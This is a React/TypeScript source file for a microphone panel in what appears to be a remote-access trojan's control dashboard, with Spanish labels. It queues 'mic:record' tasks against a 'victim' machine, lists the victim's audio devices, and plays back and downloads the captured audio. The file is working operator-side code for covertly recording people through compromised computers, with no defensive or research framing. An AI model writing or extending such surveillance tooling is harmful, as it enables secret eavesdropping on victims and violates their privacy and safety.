'use client';
import { useEffect, useRef, useState } from 'react';
import { Activity, CircleStop, Download, Mic } from 'lucide-react';
import { useApi, mutate } from '@/hooks/useApi';
import type { Task, Victim } from '@/lib/types';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';

type MicResult = { data?: string; bytes?: number; seconds?: number; mime?: string; device?: string };

export function MicPanel({ victim }: { victim: Victim }) {
  const [seconds, setSeconds] = useState(15);
  const [device, setDevice] = useState('');
  const [busy, setBusy] = useState(false);
  const [elapsed, setElapsed] = useState(0);
  const [levels, setLevels] = useState<number[]>(Array.from({ length: 32 }, () => 0));
  const audio = useRef<HTMLAudioElement | null>(null);
  const context = useRef<AudioContext | null>(null);
  const frame = useRef<number | null>(null);
  const { data, refresh } = useApi<{ items: Task[] }>(`/tasks?victim=${victim.id}&limit=30`, { pollMs: 2_000 });

  const tasks = data?.items ?? [];
  const record = tasks.find((task) => task.name === 'mic:record' || task.name === 'mic');
  const result = record?.result as MicResult | undefined;
  const devices = (tasks.find((task) => task.name === 'webcam:devices')?.result as { audio?: string[] } | undefined)?.audio ?? [];
  const running = Boolean(record && ['queued', 'running'].includes(record.status));
  const error = record?.status === 'error' ? record.error : null;

  useEffect(() => {
    if (!running) return;
    const started = Date.now();
    const timer = setInterval(() => setElapsed(Math.min(seconds, Math.round((Date.now() - started) / 1000))), 250);
    return () => clearInterval(timer);
  }, [running, seconds]);

  useEffect(() => {
    const element = audio.current;
    if (!element || !result?.data) return;
    let cancelled = false;
    const analyser = () => {
      if (cancelled || !element) return;
      try {
        context.current ??= new AudioContext();
        const source = context.current.createMediaElementSource(element);
        const node = context.current.createAnalyser();
        node.fftSize = 128;
        source.connect(node);
        node.connect(context.current.destination);
        const buffer = new Uint8Array(node.frequencyBinCount);
        const tick = () => {
          node.getByteFrequencyData(buffer);
          const bars = Array.from({ length: 32 }, (_, index) => Math.round((buffer[index * 2] ?? 0) / 2.55));
          setLevels(bars);
          frame.current = requestAnimationFrame(tick);
        };
        tick();
      } catch { /* element already wired */ }
    };
    element.addEventListener('play', analyser, { once: true });
    return () => { cancelled = true; if (frame.current) cancelAnimationFrame(frame.current); };
  }, [result?.data]);

  async function start() {
    setBusy(true);
    setElapsed(0);
    try {
      await mutate('/tasks', 'POST', { victim_ids: [victim.id], name: 'mic:record', params: { seconds, ...(device ? { device } : {}) }, timeout_sec: 90 });
      refresh();
    } finally { setTimeout(() => setBusy(false), 1_000); }
  }

  const secondsReal = result?.seconds ? Math.round(result.seconds) : 0;

  return (
    <section className="xp-card rounded-lg border border-line bg-panel/30 p-2" aria-label="Micrófono">
      <div className="flex flex-wrap items-center gap-2">
        <Activity className="h-3.5 w-3.5 text-muted" />
        <p className="text-2xs uppercase tracking-wide text-muted">Micrófono</p>
        {running ? <Badge tone="bad">REC {elapsed}s</Badge> : null}
        <div className="ml-auto flex items-center gap-1">
          <label className="flex items-center gap-1 text-2xs text-muted">seg
            <select value={seconds} onChange={(event) => setSeconds(Number(event.target.value))} className="h-6 rounded border border-line bg-bg px-1" aria-label="Duración">
              {[5, 10, 15, 30, 60].map((value) => <option key={value} value={value}>{value}</option>)}
            </select>
          </label>
          <select value={device} onChange={(event) => setDevice(event.target.value)} className="h-6 max-w-[180px] rounded border border-line bg-bg px-1 text-2xs" aria-label="Micrófono">
            <option value="">predeterminado</option>
            {devices.map((item) => <option key={item} value={item}>{item}</option>)}
          </select>
          {running ? <Button size="sm" variant="destructive" onClick={() => { void mutate(`/tasks/${record!.id}/cancel`, 'POST').catch(() => undefined); }}><CircleStop className="h-3 w-3" /> parar</Button> : <Button size="sm" disabled={!victim.socket || busy} loading={busy} onClick={() => void start()}><Mic className="h-3 w-3" /> grabar</Button>}
        </div>
      </div>

      <div className="mt-1.5 flex h-10 items-end gap-[2px] rounded border border-line bg-bg/60 px-1 py-1" aria-hidden="true">
        {levels.map((level, index) => <span key={index} className="flex-1 rounded-sm bg-brand/70" style={{ height: `${Math.max(4, level)}%` }} />)}
      </div>

      {error ? <p className="mt-1 rounded border border-bad/30 bg-bad/10 px-2 py-1 text-2xs text-bad" data-mic-error>{error}</p> : null}
      {result?.data ? (
        <div className="mt-1.5 space-y-1">
          <audio ref={audio} controls src={`data:${result.mime ?? 'audio/webm'};base64,${result.data}`} className="h-8 w-full" data-mic-player />
          <div className="flex items-center gap-2 text-2xs text-muted">
            <span>{secondsReal} s · {Math.round((result.bytes ?? 0) / 1024)} KB · {result.device || 'predeterminado'}</span>
            <a href={`data:${result.mime ?? 'audio/webm'};base64,${result.data}`} download={`mic-${record?.id}.webm`} className="ml-auto flex items-center gap-1 text-brand"><Download className="h-2.5 w-2.5" /> descargar</a>
          </div>
        </div>
      ) : !error && !running ? <p className="mt-1 text-2xs text-muted">Sin grabación. Opus/WebM por bloques de 3 s; si el dispositivo está ocupado verás el error real.</p> : null}
    </section>
  );
}
